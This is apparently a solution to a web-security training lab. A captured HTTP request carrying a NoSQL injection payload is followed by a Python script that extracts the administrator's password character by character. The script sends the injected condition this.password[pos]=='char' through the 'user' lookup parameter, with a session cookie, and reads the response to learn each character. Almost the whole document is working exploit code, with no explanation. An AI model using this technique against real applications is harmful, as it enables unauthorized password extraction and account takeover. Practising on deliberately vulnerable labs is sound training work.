# GET /user/lookup?user=administrator'%26%26this.password.length<100||'1'=='2 HTTP/2
# Host: 0ada00260304e19180dc219100f8001d.web-security-academy.net
# Cookie: session=F6yazIXXjGI3kcSWkhCruRiKTw3r54jR
# Sec-Ch-Ua-Platform: "Linux"
# Accept-Language: en-US,en;q=0.9
# Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
# User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
# Sec-Ch-Ua-Mobile: ?0
# Accept: */*
# Sec-Fetch-Site: same-origin
# Sec-Fetch-Mode: cors
# Sec-Fetch-Dest: empty
# Referer: https://0ada00260304e19180dc219100f8001d.web-security-academy.net/my-account?id=wiener
# Accept-Encoding: gzip, deflate, br
# Priority: u=1, i



import requests

baseurl = "https://0ada00260304e19180dc219100f8001d.web-security-academy.net"
chars = "abcdefghijklmnopqrstuvwxyz"
password = ""
for pos in range(0, 7):
    for char in chars:
        url = (f"{baseurl}/user/lookup?user=administrator'%26%26this.password[{pos}]=='{char}")
        cookies = {"session": "F6yazIXXjGI3kcSWkhCruRiKTw3r54jR"}
        response = requests.get(url, cookies=cookies)
        print(response.status_code)
        if "administrator" in response.text:
            print(f"Found character {char} at position {pos}")
            print(f"Current password: {password}")
            print(response.text)
            password += char
            break
